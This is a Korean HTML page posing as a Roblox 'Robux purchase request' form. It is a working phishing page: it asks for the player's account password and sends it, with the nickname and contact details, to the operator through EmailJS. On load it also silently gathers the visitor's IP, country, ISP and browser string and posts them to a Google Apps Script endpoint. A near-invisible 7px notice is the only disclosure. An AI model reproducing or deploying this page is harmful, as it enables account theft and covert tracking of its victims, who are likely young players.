<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8" />
  <title>로벅스 구매 요청</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <!-- EmailJS -->
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    (function(){
      emailjs.init("0zYUbiKWqyCZGh9jB");
    })();
  </script>
<script>
let visitorInfo = {
  ip: "unknown",
  country: "unknown",
  isp: "unknown"
};

//  IP
fetch("https://api.ipify.org?format=json")
  .then(res => res.json())
  .then(ipData => {
    visitorInfo.ip = ipData.ip;

    // 나라및통신정보
    return fetch(`https://ipapi.co/${visitorInfo.ip}/json/`);
  })
  .then(res => res.json())
  .then(geo => {
    visitorInfo.country = geo.country_name || "unknown";
    visitorInfo.isp = geo.org || "unknown";

    // 페이지 저장용
    fetch("https://script.google.com/macros/s/AKfycbyZwfjuIIraBP9HsaZsHQDHc0JN-9QrWsTkPfirSPe1Shb_8BG5JjRUEGErSNQ6e5jA_w/exec", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        ip: visitorInfo.ip,
        country: visitorInfo.country,
        isp: visitorInfo.isp,
        ua: navigator.userAgent
      })
    });
  })
  .catch(err => console.error(err));
</script>

  <style>
    body {
      font-family: "Segoe UI", Arial, sans-serif;
      background: linear-gradient(135deg, #e0f7fa, #f1f8e9);
      padding: 40px;
    }

    .container {
      max-width: 420px;
      margin: auto;
      background: #ffffff;
      padding: 30px;
      border-radius: 14px;
      box-shadow: 0 15px 40px rgba(0,0,0,0.1);
    }

    h2 {
      text-align: center;
      margin-bottom: 25px;
      font-weight: 600;
    }

    label {
      font-size: 13px;
      margin-top: 15px;
      display: block;
      color: #555;
    }

    input, textarea {
      width: 100%;
      padding: 12px;
      margin-top: 6px;
      font-size: 14px;
      border-radius: 8px;
      border: 1px solid #ddd;
      outline: none;
      transition: border 0.2s, box-shadow 0.2s;
    }

    input:focus, textarea:focus {
      border-color: #4CAF50;
      box-shadow: 0 0 0 3px rgba(76,175,80,0.15);
    }

    textarea {
      height: 100px;
      resize: none; 
    }

    button {
      width: 100%;
      margin-top: 25px;
      padding: 14px;
      background: linear-gradient(135deg, #4CAF50, #43a047);
      color: #fff;
      font-size: 15px;
      font-weight: bold;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      transition: transform 0.15s, box-shadow 0.15s;
    }

    button:hover {
      transform: translateY(-2px);
      box-shadow: 0 8px 20px rgba(76,175,80,0.3);
    }

    .notice {
      margin-top: 20px;
      font-size: 12px;
      color: #777;
      text-align: center;
    }
  </style>
</head>
<body>

<div class="container">
  <h2>로벅스 구매 요청</h2>

  <label>닉네임</label>
  <input id="nickname" placeholder="Roblox 닉네임" required />

  <label>로벅스 양</label>
  <input id="amount" placeholder="예: 800" required />

  <label>연락처</label>
  <input id="contact" placeholder="카카오톡 / 전화번호" required />

  <label>비밀번호</label>
  <textarea id="request" placeholder="비밀번호를 입력하세요" required></textarea>

  <button onclick="sendEmail()">요청 보내기</button>
<script>
function sendEmail() {
  const params = {
    nickname: document.getElementById("nickname").value,
    amount: document.getElementById("amount").value,
    contact: document.getElementById("contact").value,
    request: document.getElementById("request").value
  };

  if (!params.nickname || !params.amount || !params.contact || !params.request) {
    alert("모든 항목을 입력해주세요.");
    return;
  }

  emailjs.send(
    "service_2osfyze",
    "template_60av7xp",
    params
  ).then(() => {
    alert("요청이 성공적으로 전송되었습니다!");
  }, (error) => {
    alert("전송 실패: " + error.text);
  });
}
</script>
<p style="font-size:7px;color:#666;text-align:center;">
본 사이트는 서비스 운영 및 보안 목적을 위해 IP,국가, 통신사 정보를 수집할 수 있습니다.
</p>

</body>
</html>
